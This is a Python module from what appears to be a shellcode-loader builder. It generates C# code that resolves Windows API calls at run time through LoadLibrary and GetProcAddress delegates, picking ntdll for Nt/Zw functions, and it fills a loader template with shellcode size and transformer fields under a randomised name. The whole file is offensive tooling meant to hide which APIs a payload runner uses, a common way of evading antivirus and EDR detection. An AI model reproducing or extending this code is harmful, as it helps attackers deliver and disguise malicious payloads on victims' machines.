import random
import string
from cs.utils.typedefs import typedefs

class dynamic:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        self.apicalls = {}

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        kernel32 = []
        ntdll = []
        codeblock = ''
        for apicall in self.apicalls:
            codeblock += f"""
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate {typedefs[apicall]}
"""

        codeblock += """
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
"""
        return codeblock

    def template(self, templateCode, transformers, shellcodeSize):
        for _, field_name, _, _ in string.Formatter().parse(templateCode):
            if field_name is not None and field_name not in ['shellcodeSize', 'transformers']:
                self.apicalls[field_name] = ''
        self.resolve()
        return templateCode.format(transformers=transformers, shellcodeSize=shellcodeSize, **self.apicalls)

    def resolve(self):
        for apicall in self.apicalls:
            if apicall[0:2] in ['Nt','Zw']:
                self.apicalls[apicall] = f'(({apicall})Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary("ntdll.dll"), "{apicall}"), typeof({apicall})))'
            else:
                self.apicalls[apicall] = f'(({apicall})Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary("kernel32.dll"), "{apicall}"), typeof({apicall})))'